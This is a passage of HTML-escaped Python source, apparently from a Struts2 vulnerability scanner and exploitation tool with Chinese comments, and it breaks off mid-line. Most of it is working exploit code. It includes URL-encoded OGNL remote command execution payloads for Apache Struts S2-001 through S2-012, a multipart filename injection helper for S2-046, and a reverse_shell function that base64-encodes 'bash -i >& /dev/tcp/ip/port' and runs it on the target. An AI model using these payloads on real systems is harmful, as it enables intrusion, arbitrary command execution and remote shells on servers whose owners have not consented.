&quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;POST请求发送包装&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_tiemout, files=files)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = post_stream(url, data, headers, encoding, files)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_stream(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;分块接受数据&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.post(url, data=data, headers=headers, timeout=_tiemout, stream=True, proxies=proxies,</span><br><span class="line">                              files=None)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def encode_multipart(exp):</span><br><span class="line">    &quot;&quot;&quot;创建multipart/form-data数据包&quot;&quot;&quot;</span><br><span class="line">    boundary = &#x27;----------%s&#x27; % hex(int(time.time() * 1000))</span><br><span class="line">    data = list()</span><br><span class="line">    data.append(&#x27;--%s&#x27; % boundary)</span><br><span class="line">    content = b&#x27;x&#x27;</span><br><span class="line">    decoded_content = content.decode(&#x27;ISO-8859-1&#x27;)</span><br><span class="line">    data.append(&#x27;Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;&#123;exp&#125;&quot;&#x27;.format(exp=exp))</span><br><span class="line">    data.append(&#x27;Content-Type: text/plain\r\n&#x27;)</span><br><span class="line">    data.append(decoded_content)</span><br><span class="line">    data.append(&#x27;--%s--\r\n&#x27; % boundary)</span><br><span class="line">    return &#x27;\r\n&#x27;.join(data), boundary</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_file(url, exp, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;S2-046漏洞专用&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        coded_params, boundary = encode_multipart(exp)</span><br><span class="line">        if proxies:</span><br><span class="line">            proxy_support = urllib.request.ProxyHandler(proxies)</span><br><span class="line">            opener = urllib.request.build_opener(proxy_support)</span><br><span class="line">            urllib.request.install_opener(opener)</span><br><span class="line">        req = urllib.request.Request(url, coded_params.encode(&#x27;ISO-8859-1&#x27;))</span><br><span class="line">        req.add_header(&#x27;Content-Type&#x27;, &#x27;multipart/form-data; boundary=%s&#x27; % boundary)</span><br><span class="line">        if headers:</span><br><span class="line">            for key, value in headers.items():</span><br><span class="line">                req.add_header(key, value)</span><br><span class="line">        resp = urllib.request.urlopen(req)</span><br><span class="line">        html = resp.read().decode(encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_cmd(cmd, type=&#x27;string&#x27;):</span><br><span class="line">    &quot;&quot;&quot;命令解析，将要执行的命令解析为字符串格式&quot;&quot;&quot;</span><br><span class="line">    cmd = shlex.split(cmd)</span><br><span class="line">    if type == &#x27;string&#x27;:</span><br><span class="line">        cmd_str = &#x27;&quot;&#x27; + &#x27;&quot;,&quot;&#x27;.join(cmd) + &#x27;&quot;&#x27;</span><br><span class="line">    elif type == &#x27;xml&#x27;:</span><br><span class="line">        cmd_str = &#x27;&lt;string&gt;&#x27; + &#x27;&lt;/string&gt;&lt;string&gt;&#x27;.join(cmd) + &#x27;&lt;/string&gt;&#x27;</span><br><span class="line">    else:</span><br><span class="line">        cmd_str = cmd</span><br><span class="line">    return cmd_str</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_headers(headers):</span><br><span class="line">    &quot;&quot;&quot;将headers字符串解析为字典&quot;&quot;&quot;</span><br><span class="line">    if not headers:</span><br><span class="line">        return default_headers</span><br><span class="line">    new_headers = copy.deepcopy(default_headers)</span><br><span class="line">    headers = headers.split(&#x27;&amp;&#x27;)</span><br><span class="line">    for header in headers:</span><br><span class="line">        header = header.split(&#x27;:&#x27;)</span><br><span class="line">        new_headers[header[0].strip()] = header[1].strip()</span><br><span class="line">    return new_headers</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_hash():</span><br><span class="line">    &quot;&quot;&quot;获取随机字符串&quot;&quot;&quot;</span><br><span class="line">    letters = string.ascii_letters</span><br><span class="line">    rand = &#x27;&#x27;.join(random.sample(letters, 10))</span><br><span class="line">    hash = hashlib.md5(rand.encode()).hexdigest()</span><br><span class="line">    return hash</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def echo_check(self):</span><br><span class="line">    &quot;&quot;&quot;通过echo输出检查漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">    hash_str = get_hash()</span><br><span class="line">    html = self.exec_cmd(&quot;echo &quot; + hash_str)</span><br><span class="line">    if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">        return html</span><br><span class="line">    elif hash_str in html:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def reverse_shell(self, ip, port):</span><br><span class="line">    &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">    cmd = &quot;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125;/&#123;port&#125; 0&gt;&amp;1&quot;.format(ip=ip, port=port)</span><br><span class="line">    cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    shell = self.shell.replace(&#x27;SHELL&#x27;, cmd)</span><br><span class="line">    html = self.exec_cmd(shell)</span><br><span class="line">    return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;检查文件是否存在&quot;&quot;&quot;</span><br><span class="line">    if os.path.exists(file_path):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;file&#125;文件不存在!&quot;.format(file=file_path), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_file(file_path, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;读文件，默认使用UTF-8编码&quot;&quot;&quot;</span><br><span class="line">    if check_file(file_path):</span><br><span class="line">        with open(file_path, &#x27;r&#x27;, encoding=encoding) as f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        return data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_urls(file):</span><br><span class="line">    &quot;&quot;&quot;读取URL文件&quot;&quot;&quot;</span><br><span class="line">    if check_file(file):</span><br><span class="line">        with open(file, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f:</span><br><span class="line">            urls = f.readlines()</span><br><span class="line">        urls = [url.strip() for url in urls if url and url.strip()]</span><br><span class="line">        return urls</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_int(name, t):</span><br><span class="line">    &quot;&quot;&quot;检查int变量&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        t = int(t)</span><br><span class="line">        return t</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] 参数&#123;name&#125;必须为整数!&quot;.format(name=name), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_001:</span><br><span class="line">    &quot;&quot;&quot;S2-001漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = &quot;%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(&#x27;%2F&#x27;))%2C%23response.flush()%2C%23response.close()%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-001&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.web_path)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_003:</span><br><span class="line">    &quot;&quot;&quot;S2-003漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据; 支持任意命令执行&quot;</span><br><span class="line">    exec_payload = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-003&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_005:</span><br><span class="line">    &quot;&quot;&quot;S2-005漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行&quot;</span><br><span class="line">    web_path = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&amp;%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&amp;%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&quot;</span><br><span class="line">    exec_payload1 = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line">    exec_payload2 = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43mycmd%5C75%5C%27&#123;cmd&#125;%5C%27%27%29%28d%29%29&amp;%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&amp;%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&amp;%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&amp;%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&amp;%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&amp;%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        self.exec_payload = self.exec_payload1</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-005&#x27;</span><br><span class="line">        else:</span><br><span class="line">            self.exec_payload = self.exec_payload2</span><br><span class="line">            html = echo_check(self)</span><br><span class="line">            if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                return html</span><br><span class="line">            if html:</span><br><span class="line">                self.is_vul = True</span><br><span class="line">                return &#x27;S2-005&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_007:</span><br><span class="line">    &quot;&quot;&quot;S2-007漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;&#x27;%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))%20%2B%20&#x27;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-007&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_008:</span><br><span class="line">    &quot;&quot;&quot;S2-008漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29)&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-008&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_009:</span><br><span class="line">    &quot;&quot;&quot;S2-009漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27&#123;cmd&#125;%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(&#123;key&#125;)(%27meh%27)]&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;key&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data.split(&#x27;=&#x27;)[0].strip()</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-009&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), key=self.data)</span><br><span class="line">        html = get(self.url + &quot;&amp;&#123;key&#125;=&#123;payload&#125;&quot;.format(key=self.data, payload=payload), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_012:</span><br><span class="line">    &quot;&quot;&quot;S2-012漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c 